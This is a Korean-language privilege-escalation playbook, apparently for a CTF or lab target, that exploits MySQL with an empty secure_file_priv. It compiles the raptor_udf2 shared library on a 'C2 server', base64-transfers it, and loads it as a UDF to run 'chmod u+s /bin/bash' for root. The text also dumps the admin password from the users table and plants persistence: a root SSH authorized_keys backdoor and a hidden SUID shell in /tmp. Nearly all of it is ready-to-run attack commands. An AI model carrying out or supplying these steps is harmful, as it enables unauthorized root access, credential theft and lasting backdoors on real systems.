# MySQL UDF 권한 상승 - 즉시 실행

## 🎯 핵심 발견
```
@@secure_file_priv: NULL  ← 제한 없음! 파일 읽기/쓰기 가능!
```

이제 MySQL UDF로 권한 상승이 가능합니다!

---

## 방법 1: C2 서버에서 raptor_udf2.so 컴파일 후 전송

### C2 서버에서:

```bash
cd /tmp

# raptor_udf2.c 다운로드
wget https://www.exploit-db.com/download/1518 -O raptor_udf2.c

# 컴파일 (64비트)
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# base64 인코딩
base64 raptor_udf2.so | tr -d '\n' > raptor_udf2.b64

# 출력
cat raptor_udf2.b64
```

**base64 문자열을 복사**

### 타겟에서:

```bash
cd /tmp

# base64 문자열 붙여넣기 (한줄로)
echo "[base64 문자열]" | base64 -d > raptor_udf2.so

chmod +x raptor_udf2.so
ls -la raptor_udf2.so
file raptor_udf2.so
```

### MySQL에서 UDF 로드:

```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << 'MYSQLEOF'
USE mysql;
CREATE TABLE IF NOT EXISTS udf_data (line blob);
DELETE FROM udf_data;
MYSQLEOF

# .so 파일을 MySQL 테이블에 로드 (파일에서)
mysql -u webuser -p'WebPassw0rd!' mysql -e "INSERT INTO udf_data VALUES (LOAD_FILE('/tmp/raptor_udf2.so'));"

# 플러그인 디렉토리로 복사
mysql -u webuser -p'WebPassw0rd!' mysql -e "SELECT * FROM udf_data INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';"

# UDF 생성
mysql -u webuser -p'WebPassw0rd!' mysql -e "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';"

# 권한 상승 - SUID bash 생성
mysql -u webuser -p'WebPassw0rd!' mysql -e "SELECT do_system('chmod u+s /bin/bash');"

# bash 실행
/bin/bash -p
whoami
```

---

## 방법 2: 간단한 C shell UDF (직접 작성)

타겟에 gcc가 있으니 (cc1만 없음) 다른 방법으로 컴파일 시도

### 타겟에서:

```bash
cd /tmp

# 간단한 UDF 코드 작성
cat > shell_udf.c << 'UDFEOF'
#include <stdio.h>
#include <stdlib.h>

int do_system(char *cmd) {
    return system(cmd);
}
UDFEOF

# 컴파일 시도 (여러 방법)
gcc -shared -o shell_udf.so shell_udf.c -fPIC
```

**cc1 에러 나면 방법 1 사용**

---

## 방법 3: lib_mysqludf_sys 사용 (GitHub)

### C2 서버:

```bash
cd /tmp
git clone https://github.com/mysqludf/lib_mysqludf_sys.git
cd lib_mysqludf_sys

# 컴파일
gcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so

# base64
base64 lib_mysqludf_sys.so | tr -d '\n' > sys.b64
cat sys.b64
```

---

## 🚀 즉시 실행 순서 (추천)

### 1단계: Admin 비밀번호 확인

```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT * FROM users WHERE username='admin';"
```

### 2단계: C2 서버에서 raptor_udf2.so 준비

**C2 서버 (ubuntu@ip-10-0-3-106):**

```bash
cd /tmp

# exploit-db에서 다운로드
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c

# 컴파일
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# 확인
ls -la raptor_udf2.so
file raptor_udf2.so

# base64 인코딩
base64 raptor_udf2.so | tr -d '\n'
```

**출력된 base64를 복사 (매우 길 것임)**

### 3단계: 타겟에서 디코딩

```bash
cd /tmp

# base64 붙여넣기
echo "복사한_base64_문자열" | base64 -d > raptor_udf2.so

# 확인
ls -la raptor_udf2.so
file raptor_udf2.so
```

### 4단계: MySQL UDF 로드 및 실행

```bash
# MySQL에 로드
mysql -u webuser -p'WebPassw0rd!' << 'EOF'
USE mysql;
CREATE TABLE IF NOT EXISTS foo(line blob);
INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('chmod u+s /bin/bash');
EOF

# 권한 확인
ls -la /bin/bash

# root 쉘
/bin/bash -p
whoami
id
```

---

## 대안: Python이 있으면

Splunk에서 python3.9를 사용하므로:

```bash
/opt/splunk/bin/python3.9 --version
```

**있으면 Python으로 exploit 작성 가능**

---

## 대안: 웹에서 admin 로그인

### 타겟에서:

```bash
# admin 비밀번호 확인
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT username, password FROM users WHERE username='admin';"
```

**웹 브라우저에서:**
1. http://3.34.181.145/login.php
2. admin / [변경한 비밀번호]로 로그인
3. 관리자 기능으로 파일 업로드 또는 명령 실행

---

## MySQL 상세 확인

```bash
# 현재 사용자 권한
mysql -u webuser -p'WebPassw0rd!' -e "SELECT USER(), CURRENT_USER();"
mysql -u webuser -p'WebPassw0rd!' -e "SHOW GRANTS;"

# File 권한 확인
mysql -u webuser -p'WebPassw0rd!' -e "SELECT user, host, File_priv FROM mysql.user WHERE user='webuser';"

# 플러그인 확인
mysql -u webuser -p'WebPassw0rd!' -e "SELECT * FROM mysql.func;"

# 테이블 확인
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SHOW TABLES;"
```

---

## 실패시 트러블슈팅

### LOAD_FILE 실패:
```sql
-- 권한 확인
SELECT FILE('/tmp/raptor_udf2.so');

-- 파일 존재 확인
SELECT LOAD_FILE('/tmp/raptor_udf2.so') IS NOT NULL;
```

### DUMPFILE 실패:
```sql
-- 플러그인 디렉토리 쓰기 권한
SELECT @@plugin_dir;

-- /tmp에 먼저 시도
SELECT * FROM foo INTO DUMPFILE '/tmp/test.so';
```

---

## 성공 후

```bash
# Root 확인
whoami
id

# 플래그 찾기
find / -name "*flag*" -type f 2>/dev/null
cat /root/flag.txt
cat /home/*/flag.txt

# 백도어 설치
mkdir -p /root/.ssh
echo 'ssh-rsa 공개키...' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 영구 SUID
cp /bin/bash /tmp/.rootshell
chmod u+s /tmp/.rootshell
```

---

## 다음 명령어 (타겟에서)

```bash
# Admin 확인
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT * FROM users WHERE username='admin';"

# 또는 모든 사용자
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT * FROM users;"
```

**그리고 C2 서버에서 raptor_udf2.so 컴파일 시작!**
